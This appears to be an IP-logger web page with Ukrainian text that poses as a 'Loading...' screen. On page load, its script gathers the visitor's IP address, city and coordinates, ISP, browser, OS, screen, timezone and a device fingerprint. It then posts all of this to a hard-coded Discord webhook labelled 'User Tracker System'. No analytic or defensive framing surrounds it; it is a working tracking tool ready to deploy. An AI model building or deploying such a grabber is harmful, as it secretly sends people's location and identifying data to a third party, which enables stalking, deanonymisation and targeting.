<!DOCTYPE html>
<html lang="uk">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Завантаження...</title>
<style>
:root {
  --bg: #0a0e27;
  --surface: #151b3d;
  --text: #e4e7f0;
  --text-dim: #8b92b8;
  --accent: #00d9ff;
}

@media (prefers-color-scheme: light) {
  :root {
    --bg: #f5f7fa;
    --surface: #ffffff;
    --text: #1a1d2e;
    --text-dim: #5a6080;
    --accent: #0088cc;
  }
}

* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
}

body {
  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
  background: var(--bg);
  color: var(--text);
  min-height: 100vh;
  display: flex;
  align-items: center;
  justify-content: center;
  padding: 2rem;
}

.container {
  text-align: center;
  max-width: 500px;
}

.spinner {
  width: 60px;
  height: 60px;
  border: 4px solid var(--surface);
  border-top: 4px solid var(--accent);
  border-radius: 50%;
  animation: spin 1s linear infinite;
  margin: 0 auto 2rem;
}

@keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}

h1 {
  font-size: 2rem;
  margin-bottom: 1rem;
  color: var(--text);
}

.status {
  color: var(--text-dim);
  font-size: 1.1rem;
  margin-bottom: 2rem;
}

.details {
  background: var(--surface);
  border-radius: 12px;
  padding: 1.5rem;
  text-align: left;
  margin-top: 2rem;
  display: none;
}

.details.show {
  display: block;
}

.detail-item {
  padding: 0.5rem 0;
  border-bottom: 1px solid rgba(255,255,255,0.1);
}

.detail-item:last-child {
  border-bottom: none;
}

.detail-label {
  color: var(--text-dim);
  font-size: 0.85rem;
  text-transform: uppercase;
  letter-spacing: 0.5px;
}

.detail-value {
  color: var(--text);
  font-size: 1rem;
  margin-top: 0.25rem;
}

.success {
  color: #00ff88;
}

.error {
  color: #ff5555;
}
</style>
</head>
<body>

<div class="container">
  <div class="spinner"></div>
  <h1 id="title">Завантаження</h1>
  <p class="status" id="status">Збирання інформації...</p>

  <div class="details" id="details">
    <div class="detail-item">
      <div class="detail-label">IP Адреса</div>
      <div class="detail-value" id="ip-display">—</div>
    </div>
    <div class="detail-item">
      <div class="detail-label">Місцезнаходження</div>
      <div class="detail-value" id="location-display">—</div>
    </div>
    <div class="detail-item">
      <div class="detail-label">Браузер</div>
      <div class="detail-value" id="browser-display">—</div>
    </div>
    <div class="detail-item">
      <div class="detail-label">Статус</div>
      <div class="detail-value" id="send-status">Надсилання...</div>
    </div>
  </div>
</div>

<script>
// ⚠️ ВСТАВТЕ ВАШ DISCORD WEBHOOK URL СЮДИ ⚠️
const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1546520839233470496/y5mkiatSqF_vcumnHENJZmen-kwRYwDLnRcX1sMfLHM66XbMJap0hd83lX29rO1-q6RL';

// Перевірка чи webhook налаштований
if (DISCORD_WEBHOOK_URL === 'YOUR_DISCORD_WEBHOOK_URL_HERE') {
  document.getElementById('title').textContent = '⚠️ Налаштування потрібне';
  document.getElementById('status').textContent = 'Відкрийте файл та вставте Discord Webhook URL';
  document.getElementById('status').className = 'status error';
  document.querySelector('.spinner').style.display = 'none';
  throw new Error('Discord webhook not configured');
}

// Функції для визначення інформації
function getBrowserInfo() {
  const ua = navigator.userAgent;
  if (ua.indexOf('Firefox') > -1) return 'Mozilla Firefox';
  if (ua.indexOf('Edg') > -1) return 'Microsoft Edge';
  if (ua.indexOf('Chrome') > -1) return 'Google Chrome';
  if (ua.indexOf('Safari') > -1) return 'Safari';
  if (ua.indexOf('Opera') > -1 || ua.indexOf('OPR') > -1) return 'Opera';
  return 'Невідомий';
}

function getOSInfo() {
  const ua = navigator.userAgent;
  if (ua.indexOf('Win') > -1) return 'Windows';
  if (ua.indexOf('Mac') > -1) return 'MacOS';
  if (ua.indexOf('Linux') > -1) return 'Linux';
  if (ua.indexOf('Android') > -1) return 'Android';
  if (ua.indexOf('iOS') > -1) return 'iOS';
  return 'Невідомо';
}

function getDeviceType() {
  const ua = navigator.userAgent;
  if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) return 'Планшет';
  if (/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua)) return 'Мобільний';
  return 'Комп\'ютер';
}

async function generateFingerprint() {
  const components = [
    navigator.userAgent,
    navigator.language,
    screen.width + 'x' + screen.height,
    screen.colorDepth,
    new Date().getTimezoneOffset(),
    navigator.hardwareConcurrency || 'unknown',
    navigator.platform
  ];

  const data = components.join('|');
  const msgBuffer = new TextEncoder().encode(data);
  const hashBuffer = await crypto.subtle.digest('SHA-256', msgBuffer);
  const hashArray = Array.from(new Uint8Array(hashBuffer));
  return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
}

// Збір базової інформації
const localInfo = {
  browser: getBrowserInfo(),
  os: getOSInfo(),
  device: getDeviceType(),
  language: navigator.language || 'Невідомо',
  screen: `${screen.width}×${screen.height}`,
  timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
  timestamp: new Date().toISOString(),
  userAgent: navigator.userAgent
};

// Відображення локальної інформації
document.getElementById('browser-display').textContent = localInfo.browser;

// Отримання IP та геолокації
fetch('https://ipapi.co/json/')
  .then(response => response.json())
  .then(async data => {
    const fingerprint = await generateFingerprint();

    // Повна інформація для відправки
    const fullInfo = {
      ...localInfo,
      ip: data.ip || 'Недоступно',
      city: data.city || 'Невідомо',
      region: data.region || '',
      country: data.country_name || 'Невідомо',
      countryCode: data.country_code || '',
      latitude: data.latitude || null,
      longitude: data.longitude || null,
      isp: data.org || 'Невідомо',
      postal: data.postal || '',
      fingerprint: fingerprint
    };

    // Відображення на сторінці
    document.getElementById('ip-display').textContent = fullInfo.ip;
    document.getElementById('location-display').textContent =
      `${fullInfo.city}, ${fullInfo.region}, ${fullInfo.country}`;

    // Створення Discord embed повідомлення
    const embed = {
      title: '🔔 Новий Відвідувач',
      color: 65535, // cyan
      fields: [
        {
          name: '🌐 IP Адреса',
          value: fullInfo.ip,
          inline: true
        },
        {
          name: '📍 Місцезнаходження',
          value: `${fullInfo.city}, ${fullInfo.country}`,
          inline: true
        },
        {
          name: '💻 Браузер',
          value: fullInfo.browser,
          inline: true
        },
        {
          name: '🖥️ ОС',
          value: fullInfo.os,
          inline: true
        },
        {
          name: '📱 Пристрій',
          value: fullInfo.device,
          inline: true
        },
        {
          name: '🌍 Мова',
          value: fullInfo.language,
          inline: true
        },
        {
          name: '📐 Екран',
          value: fullInfo.screen,
          inline: true
        },
        {
          name: '🕐 Часовий пояс',
          value: fullInfo.timezone,
          inline: true
        },
        {
          name: '⏰ Час',
          value: new Date(fullInfo.timestamp).toLocaleString('uk-UA'),
          inline: true
        },
        {
          name: '🌐 Провайдер',
          value: fullInfo.isp,
          inline: false
        },
        {
          name: '🗺️ Координати',
          value: fullInfo.latitude && fullInfo.longitude
            ? `${fullInfo.latitude.toFixed(4)}°, ${fullInfo.longitude.toFixed(4)}°`
            : 'Недоступно',
          inline: false
        },
        {
          name: '🔐 Цифровий відбиток',
          value: `\`${fullInfo.fingerprint}\``,
          inline: false
        }
      ],
      footer: {
        text: 'User Tracker System'
      },
      timestamp: fullInfo.timestamp
    };

    // Відправка в Discord
    return fetch(DISCORD_WEBHOOK_URL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        embeds: [embed]
      })
    }).then(response => {
      console.log('Discord response status:', response.status);
      if (response.ok) {
        document.getElementById('title').textContent = '✅ Успішно';
        document.getElementById('status').textContent = 'Дані надіслано';
        document.getElementById('status').className = 'status success';
        document.getElementById('send-status').textContent = '✅ Надіслано в Discord';
        document.getElementById('send-status').className = 'detail-value success';
      } else {
        return response.text().then(text => {
          console.error('Discord error:', text);
          throw new Error(`Discord webhook failed: ${response.status} - ${text}`);
        });
      }
    });
  })
  .catch(error => {
    console.error('Помилка:', error);
    document.getElementById('title').textContent = '⚠️ Помилка';
    document.getElementById('status').textContent = 'Не вдалося надіслати дані';
    document.getElementById('status').className = 'status error';
    document.getElementById('send-status').textContent = `❌ ${error.message || 'Помилка надсилання'}`;
    document.getElementById('send-status').className = 'detail-value error';
  })
  .finally(() => {
    document.querySelector('.spinner').style.display = 'none';
    document.getElementById('details').classList.add('show');
  });
</script>

</body>
</html>
